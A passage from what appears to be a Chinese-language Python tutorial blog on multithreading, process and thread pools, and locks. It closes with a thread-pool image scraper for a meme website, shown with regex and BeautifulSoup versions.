<p>程序的实现与多进程差别不大，只是这里不用multiProcessing.JoinableQueue进行队列的操作，一般的队列就可以满足要求</p>
</blockquote>
<ul>
<li><p>通过队列实现多线程并发实例：打印26个字母（代码和多进程的差别并不大）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time, random</span><br><span class="line"><span class="keyword">import</span> threading, queue</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value = q.get()</span><br><span class="line">            print(<span class="string">'GET &#123;&#125; from queue.'</span>.format(value))</span><br><span class="line">            time.sleep(random.random())</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            q.task_done()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    pw1 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    pw2 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    pw1.daemon = <span class="keyword">True</span></span><br><span class="line">    pw2.daemon = <span class="keyword">True</span></span><br><span class="line">    pw1.start()</span><br><span class="line">    pw2.start()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [chr(ord(<span class="string">'A'</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>)]:</span><br><span class="line">        q.put(x)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        q.join()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">'stopped by hand'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530162960.12.png" alt></p>
</li>
</ul>
</li>
</ol>
<h3 id="多线程补充"><a href="#多线程补充" class="headerlink" title="多线程补充"></a>多线程补充</h3><blockquote>
<p>既然说到了用队列实现多线程并发，再补充通过threading初始化，不调用队列实现多线程并发，这里要多出一个线程不安全的问题，用线程锁来解决</p>
</blockquote>
<ol>
<li><p>不设计线程锁实例：(以前测试的时候出现线程不安全的问题，现在运行以后没有了，应该是python版本的修复)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> n</span><br><span class="line">        print(n,self.name)</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"__main__"</span> == __name__:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    ThreadList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        t = MyThread()</span><br><span class="line">        ThreadList.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.join</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530163771.85.png" alt></p>
</li>
<li><p>设计线程锁的实例（尽管现在测试没有出现线程不安全的问题，还是将它作为补充）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> n, lock</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            print(n , self.name)</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"__main__"</span> == __name__:</span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    ThreadList = []</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        t = MyThread()</span><br><span class="line">        ThreadList.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530163912.26.png" alt></p>
</li>
</ol>
<h3 id="通过进程池和线程池来实现并发设计"><a href="#通过进程池和线程池来实现并发设计" class="headerlink" title="通过进程池和线程池来实现并发设计"></a>通过进程池和线程池来实现并发设计</h3><blockquote>
<p>通过进程池和线程池实现并发设计，也算是对上一篇多进程学习的补充与应用</p>
</blockquote>
<h4 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h4><blockquote>
<p>进程池的使用有四种方式：apply_async、apply、map_async、map。其中apply_async和map_async是异步的，也就是启动进程函数之后会继续执行后续的代码不用等待进程函数返回。apply_async和map_async方式提供了一些获取进程函数状态的函数：ready()、successful()、get()。join()放在close()后面，是多进程中说到过的</p>
</blockquote>
<ul>
<li>通过一个实例来体现Python的进程池中的四种方法的特点，主要的区别是在异步</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">'msg:'</span>,msg)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'func_return: %s'</span> % msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#apply_async</span></span><br><span class="line">    print(<span class="string">'\n------apply_async--------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg = <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply_async(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply_async:不阻塞'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        i.wait()     <span class="comment">#等待进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> i.ready():            <span class="comment">#判断进程函数是否已经启动了</span></span><br><span class="line">            <span class="keyword">if</span> i.successful():   <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">                print(i.get())   <span class="comment">#输出进程函数的返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#apply</span></span><br><span class="line">    print(<span class="string">'\n----------apply---------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg =  <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply:阻塞'</span>)           <span class="comment">#执行完func才可以执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(results)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map</span></span><br><span class="line">    print(<span class="string">'\n---------map-----------'</span>)</span><br><span class="line">    args = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">5</span>)</span><br><span class="line">    return_data = pool.map(func,args)</span><br><span class="line">    print(<span class="string">'map:阻塞'</span>) <span class="comment">#执行完func才执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(return_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map_async</span></span><br><span class="line">    print(<span class="string">'\n-------map_async---------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">5</span>)</span><br><span class="line">    result = pool.map_async(func,args)</span><br><span class="line">    print(<span class="string">'ready:'</span>,result.ready())</span><br><span class="line">    print(<span class="string">'不阻塞'</span>)</span><br><span class="line">    result.wait()  <span class="comment">#等待所有进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result.ready():           <span class="comment">#判断进程函是否已经启动了</span></span><br><span class="line">        <span class="keyword">if</span> result.successful():  <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">            print(result.get())  <span class="comment">#输出进程函数的返回值</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530167366.44.png" alt></p>
<h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><blockquote>
<p>线程池使用multiprocessing提供的线程池，线程池的使用有四种方式：apply_async、apply、map_async、map，代码与进程池类似。下面直接贴代码，实现的过程与进程池基本一致</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">'msg:'</span>,msg)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'func_return: %s'</span> % msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#apply_async</span></span><br><span class="line">    print(<span class="string">'\n------apply_async--------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg = <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply_async(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply_async:不阻塞'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        i.wait()     <span class="comment">#等待进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> i.ready():            <span class="comment">#判断进程函数是否已经启动了</span></span><br><span class="line">            <span class="keyword">if</span> i.successful():   <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">                print(i.get())   <span class="comment">#输出进程函数的返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#apply</span></span><br><span class="line">    print(<span class="string">'\n----------apply---------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg =  <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply:阻塞'</span>)           <span class="comment">#执行完func才可以执行该语句</span></span><br><span class="line">    <span class="comment"># pool.close()</span></span><br><span class="line">    <span class="comment"># pool.join()</span></span><br><span class="line">    print(results)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map</span></span><br><span class="line">    print(<span class="string">'\n---------map-----------'</span>)</span><br><span class="line">    args = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">5</span>)</span><br><span class="line">    return_data = pool.map(func,args)</span><br><span class="line">    print(<span class="string">'map:阻塞'</span>) <span class="comment">#执行完func才执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(return_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map_async</span></span><br><span class="line">    print(<span class="string">'\n-------map_async---------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">5</span>)</span><br><span class="line">    result = pool.map_async(func,args)</span><br><span class="line">    print(<span class="string">'ready:'</span>,result.ready())</span><br><span class="line">    print(<span class="string">'不阻塞'</span>)</span><br><span class="line">    result.wait()  <span class="comment">#等待所有进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result.ready():           <span class="comment">#判断进程函是否已经启动了</span></span><br><span class="line">        <span class="keyword">if</span> result.successful():  <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">            print(result.get())  <span class="comment">#输出进程函数的返回值</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530167991.95.png" alt></p>
<h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><blockquote>
<p>通过对比可以发现线程池和进程池的代码差别并不是很大，和前面通过队列实现并发一样，所以在选取以何种方式做并发时还是要结合实际的情况</p>
</blockquote>
<h3 id="实例应用"><a href="#实例应用" class="headerlink" title="实例应用"></a>实例应用</h3><blockquote>
<p>学习了这么多，还是要进行实际运用，接下来利用线程池做一个高并发的爬虫，同时也可以巩固一下爬虫。这个练习是通过线程池结合队列爬取表情包(emmm)，以斗图啦网站为例(<a href="https://www.doutula.com" target="_blank" rel="noopener">https://www.doutula.com</a>)</p>
</blockquote>
<ul>
<li><p>分析页面，在最新表情中表情包最多，一共有1655页，每一页的连接为：<a href="https://www.doutula.com/photo/list/?page=1，变动的知识page={}，所以通过队列来进行遍历。然后分析单个页面的元素：每一个表情包都是由一个a标签来构成，我们需要的是图片链接和表情包名称![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530181891.94.png)" target="_blank" rel="noopener">https://www.doutula.com/photo/list/?page=1，变动的知识page={}，所以通过队列来进行遍历。然后分析单个页面的元素：每一个表情包都是由一个a标签来构成，我们需要的是图片链接和表情包名称![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530181891.94.png)</a></p>
</li>
<li><p>当然，我们查看的时候看到的是浏览器渲染以后的页面，所以元素可能会是动态生成的；如果要查看未渲染之前的图片，直接查看源码，也是一样的。</p>
</li>
<li><p>分析一下图片的连接：该网站使用新浪的图床<code>ws1.sinaimg.cn</code>,多查看几个图片地址发现不一定是<code>ws1</code>子域名 ，可能是是任何<code>ws</code>开头，后面跟数字 ，出现这种情况的原因是：根据HTTP/1.1协议规定，浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞 ，所以利用不同的子域来绕过限制。这一点其实不影响我们（假如你的正则是直接匹配图片完整连接）</p>
</li>
<li><p>经过测试，网站没有做反爬，接下来就简单了，步骤如下：</p>
<ul>
<li>获取单个页面用正则匹配img标签的图片地址和图片描述</li>
<li>将获取到的表情包下载保存</li>
<li>改变page参数爬取所有的列表页面</li>
</ul>
</li>
<li><p>当然，重要的是用上线程池，为了提高爬取速度，再加上进程的通信</p>
</li>
<li><p>代码实现：</p>
<ul>
<li><p>设置图片保存的文件夹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建两个线程池，分别用于图片任务和页面任务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>用正则去匹配图片信息，并将获取到的图片链接和描述入队</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    pattern = re.compile(<span class="string">'data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;'</span>,re.S)</span><br><span class="line">    img_list = re.findall(pattern,html)</span><br><span class="line">    <span class="keyword">for</span> url, name <span class="keyword">in</span> img_list:</span><br><span class="line">        <span class="comment">#将图片的后缀加到name中，方便后面的保存</span></span><br><span class="line">        name = name + url[<span class="number">-4</span>:]</span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取页面的源码（尽管没有限制，但还是加上UA头和cookie）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持,确保连接的是同一个页面，将同一个页面的爬取完以后再连接下一个页面</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        get_imglist(response.text)</span><br></pre></td></tr></table></figure>
</li>
<li><p>保存表情包：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br></pre></td></tr></table></figure>
</li>
<li><p>主函数（启动线程池，队列等）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ef main():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line">    <span class="comment"># get_page()</span></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get(),picqueue.qsize(),pagequeue.qsize())</span><br></pre></td></tr></table></figure>
</li>
<li><p>完整代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置图片保存的文件夹,如果运行的py文件存在，os.path.dirname(__file__)输出完整的目录，如果是相对路径，输出为空</span></span><br><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br><span class="line"><span class="comment"># print(BASE_DIR)</span></span><br><span class="line"><span class="comment">#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</span></span><br><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建两个线程池，分别用于图片任务和页面任务</span></span><br><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">error = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#用正则去匹配图片信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    pattern = re.compile(<span class="string">'data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;'</span>,re.S)</span><br><span class="line">    img_list = re.findall(pattern,html)</span><br><span class="line">    <span class="keyword">for</span> url, name <span class="keyword">in</span> img_list:</span><br><span class="line">        name = name + url[<span class="number">-4</span>:]</span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        get_imglist(response.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line">    <span class="comment"># get_page()</span></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get(),picqueue.qsize(),pagequeue.qsize())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行结果：</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530183677.11.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530183691.54.png" alt></p>
</li>
</ul>
</li>
<li><p>以上是通过正则表达式来做的，下面稍加修改，用解析库来做：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br><span class="line"><span class="comment"># print(BASE_DIR)</span></span><br><span class="line"><span class="comment">#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</span></span><br><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建两个线程池，分别用于图片任务和页面任务</span></span><br><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">error = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">    img_list = soup.find_all(<span class="string">'a'</span>,class_=<span class="string">'col-xs-6 col-sm-3'</span>)</span><br><span class="line">    <span class="comment"># print(img_list)</span></span><br><span class="line">    <span class="keyword">for</span> imgs <span class="keyword">in</span> img_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = imgs.find(<span class="string">'img'</span>)[<span class="string">'data-original'</span>]</span><br><span class="line">            name = imgs.find(<span class="string">'p'</span>,style=<span class="string">'display: none'</span>).text + url[<span class="number">-4</span>:]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span 